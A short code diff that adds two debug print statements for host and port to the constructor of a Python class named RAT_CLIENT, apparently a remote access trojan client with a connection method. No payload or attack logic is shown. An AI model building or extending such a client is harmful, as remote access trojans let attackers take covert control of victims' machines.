@@ -39,7 +39,8 @@ class RAT_CLIENT:
         self.host = host
         self.port = port
         self.curdir = os.getcwd()
-
+        print (host)
+        print (port)
     def build_connection(self):
         connected = False
         global s
